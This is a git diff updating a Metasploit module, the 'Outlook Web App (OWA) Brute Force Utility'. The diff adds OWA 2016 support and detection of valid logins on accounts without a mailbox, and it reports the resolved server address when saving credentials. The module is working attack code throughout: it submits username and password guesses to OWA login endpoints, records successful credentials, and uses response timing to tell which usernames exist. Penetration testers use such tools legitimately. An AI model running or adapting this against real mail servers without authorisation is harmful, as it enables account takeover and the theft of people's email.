@@ -1,13 +1,11 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
 require 'rex/proto/ntlm/message'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::AuthBrute
   include Msf::Exploit::Remote::HttpClient
@@ -18,7 +16,7 @@ class MetasploitModule < Msf::Auxiliary
     super(
       'Name'           => 'Outlook Web App (OWA) Brute Force Utility',
       'Description'    => %q{
-        This module tests credentials on OWA 2003, 2007, 2010, and 2013 servers.
+        This module tests credentials on OWA 2003, 2007, 2010, 2013, and 2016 servers.
       },
       'Author'         =>
         [
@@ -29,7 +27,8 @@ class MetasploitModule < Msf::Auxiliary
           'Brandon Knight',
           'Pete (Bokojan) Arzamendi', # Outlook 2013 updates
           'Nate Power',                # HTTP timing option
-          'Chapman (R3naissance) Schleiss' # Save username in creds if response is less
+          'Chapman (R3naissance) Schleiss', # Save username in creds if response is less
+          'Andrew Smith' # valid creds, no mailbox
         ],
       'License'        => MSF_LICENSE,
       'Actions'        =>
@@ -69,6 +68,15 @@ class MetasploitModule < Msf::Auxiliary
               'InboxPath'   => '/owa/',
               'InboxCheck'  => /Inbox|logoff\.owa/
             }
+          ],
+          [
+            'OWA_2016',
+            {
+              'Description' => 'OWA version 2016',
+              'AuthPath'    => '/owa/auth.owa',
+              'InboxPath'   => '/owa/',
+              'InboxCheck'  => /Inbox|logoff\.owa/
+            }
           ]
         ],
       'DefaultAction' => 'OWA_2013',
@@ -83,15 +91,15 @@ class MetasploitModule < Msf::Auxiliary
         OptAddress.new('RHOST', [ true, "The target address" ]),
         OptBool.new('ENUM_DOMAIN', [ true, "Automatically enumerate AD domain using NTLM authentication", true]),
         OptBool.new('AUTH_TIME', [ false, "Check HTTP authentication response time", true])
-      ], self.class)
+      ])
 
 
     register_advanced_options(
       [
         OptString.new('AD_DOMAIN', [ false, "Optional AD domain to prepend to usernames", ''])
-      ], self.class)
+      ])
 
-    deregister_options('BLANK_PASSWORDS', 'RHOSTS','PASSWORD','USERNAME')
+    deregister_options('BLANK_PASSWORDS', 'RHOSTS')
   end
 
   def setup
@@ -159,13 +167,13 @@ class MetasploitModule < Msf::Auxiliary
     }
 
     if datastore['SSL']
-      if action.name == "OWA_2013"
+      if ["OWA_2013", "OWA_2016"].include?(action.name)
         data = 'destination=https://' << vhost << '/owa&flags=4&forcedownlevel=0&username=' << user << '&password=' << pass << '&isUtf8=1'
       else
         data = 'destination=https://' << vhost << '&flags=0&trusted=0&username=' << user << '&password=' << pass
       end
     else
-      if action.name == "OWA_2013"
+      if ["OWA_2013", "OWA_2016"].include?(action.name)
         data = 'destination=http://' << vhost << '/owa&flags=4&forcedownlevel=0&username=' << user << '&password=' << pass << '&isUtf8=1'
       else
         data = 'destination=http://' << vhost << '&flags=0&trusted=0&username=' << user << '&password=' << pass
@@ -195,20 +203,24 @@ class MetasploitModule < Msf::Auxiliary
 
     if not res
       print_error("#{msg} HTTP Connection Error, Aborting")
-      return :abort
+      return
     end
 
-    if action.name != "OWA_2013" and res.get_cookies.empty?
+    if res.peerinfo['addr'] != datastore['RHOST']
+      vprint_status("#{msg} Resolved hostname '#{datastore['RHOST']}' to address #{res.peerinfo['addr']}")
+    end
+
+    if !["OWA_2013", "OWA_2016"].include?(action.name) && res.get_cookies.empty?
         print_error("#{msg} Received invalid repsonse due to a missing cookie (possibly due to invalid version), aborting")
         return :abort
     end
-    if action.name == "OWA_2013"
-      # Check for a response code to make sure login was valid. Changes from 2010 to 2013.
+    if ["OWA_2013", "OWA_2016"].include?(action.name)
+      # Check for a response code to make sure login was valid. Changes from 2010 to 2013 / 2016
       # Check if the password needs to be changed.
       if res.headers['location'] =~ /expiredpassword/
         print_good("#{msg} SUCCESSFUL LOGIN. #{elapsed_time} '#{user}' : '#{pass}': NOTE password change required")
         report_cred(
-          ip: datastore['RHOST'],
+          ip: res.peerinfo['addr'],
           port: datastore['RPORT'],
           service_name: 'owa',
           user: user,
@@ -218,8 +230,22 @@ class MetasploitModule < Msf::Auxiliary
       end
 
       # No password change required moving on.
+      # Check for valid login but no mailbox setup
+      print_good("server type: #{res.headers["X-FEServer"]}")
+      if res.headers['location'] =~ /owa/ and res.headers['location'] !~ /reason/
+        print_good("#{msg} SUCCESSFUL LOGIN. #{elapsed_time} '#{user}' : '#{pass}'")
+        report_cred(
+          ip: res.peerinfo['addr'],
+          port: datastore['RPORT'],
+          service_name: 'owa',
+          user: user,
+          password: pass
+        )
+        return :next_user
+      end
+
       unless location = res.headers['location']
-        print_error("#{msg} No HTTP redirect.  This is not OWA 2013, aborting.")
+        print_error("#{msg} No HTTP redirect.  This is not OWA 2013 / 2016 system, aborting.")
         return :abort
       end
       reason = location.split('reason=')[1]
@@ -228,14 +254,16 @@ class MetasploitModule < Msf::Auxiliary
       else
         # Login didn't work. no point in going on, however, check if valid domain account by response time.
         if elapsed_time <= 1
-          report_cred(
-            ip: datastore['RHOST'],
-            port: datastore['RPORT'],
-            service_name: 'owa',
-            user: user
-          )
-          print_status("#{msg} FAILED LOGIN, BUT USERNAME IS VALID. #{elapsed_time} '#{user}' : '#{pass}': SAVING TO CREDS")
-          return :Skip_pass
+          unless user =~ /@\w+\.\w+/
+            report_cred(
+              ip: res.peerinfo['addr'],
+              port: datastore['RPORT'],
+              service_name: 'owa',
+              user: user
+            )
+            print_status("#{msg} FAILED LOGIN, BUT USERNAME IS VALID. #{elapsed_time} '#{user}' : '#{pass}': SAVING TO CREDS")
+            return :Skip_pass
+          end
         else
           vprint_error("#{msg} FAILED LOGIN. #{elapsed_time} '#{user}' : '#{pass}' (HTTP redirect with reason #{reason})")
           return :Skip_pass
@@ -274,14 +302,16 @@ class MetasploitModule < Msf::Auxiliary
 
     if res.redirect?
       if elapsed_time <= 1
-        report_cred(
-          ip: datastore['RHOST'],
-          port: datastore['RPORT'],
-          service_name: 'owa',
-          user: user
-        )
-        print_status("#{msg} FAILED LOGIN, BUT USERNAME IS VALID. #{elapsed_time} '#{user}' : '#{pass}': SAVING TO CREDS")
-        return :Skip_pass
+        unless user =~ /@\w+\.\w+/
+          report_cred(
+            ip: res.peerinfo['addr'],
+            port: datastore['RPORT'],
+            service_name: 'owa',
+            user: user
+          )
+          print_status("#{msg} FAILED LOGIN, BUT USERNAME IS VALID. #{elapsed_time} '#{user}' : '#{pass}': SAVING TO CREDS")
+          return :Skip_pass
+        end
       else
         vprint_error("#{msg} FAILED LOGIN. #{elapsed_time} '#{user}' : '#{pass}' (response was a #{res.code} redirect)")
         return :skip_pass
@@ -291,7 +321,7 @@ class MetasploitModule < Msf::Auxiliary
     if res.body =~ login_check
       print_good("#{msg} SUCCESSFUL LOGIN. #{elapsed_time} '#{user}' : '#{pass}'")
       report_cred(
-        ip: datastore['RHOST'],
+        ip: res.peerinfo['addr'],
         port: datastore['RPORT'],
         service_name: 'owa',
         user: user,
@@ -300,14 +330,16 @@ class MetasploitModule < Msf::Auxiliary
       return :next_user
     else
       if elapsed_time <= 1
-        report_cred(
-          ip: datastore['RHOST'],
-          port: datastore['RPORT'],
-          service_name: 'owa',
-          user: user
-        )
-        print_status("#{msg} FAILED LOGIN, BUT USERNAME IS VALID. #{elapsed_time} '#{user}' : '#{pass}': SAVING TO CREDS")
-        return :Skip_pass
+        unless user =~ /@\w+\.\w+/
+          report_cred(
+            ip: res.peerinfo['addr'],
+            port: datastore['RPORT'],
+            service_name: 'owa',
+            user: user
+          )
+          print_status("#{msg} FAILED LOGIN, BUT USERNAME IS VALID. #{elapsed_time} '#{user}' : '#{pass}': SAVING TO CREDS")
+          return :Skip_pass
+        end
       else
         vprint_error("#{msg} FAILED LOGIN. #{elapsed_time} '#{user}' : '#{pass}' (response body did not match)")
         return :skip_pass
@@ -394,5 +426,4 @@ class MetasploitModule < Msf::Auxiliary
   def msg
     "#{vhost}:#{rport} OWA -"
   end
-
 end
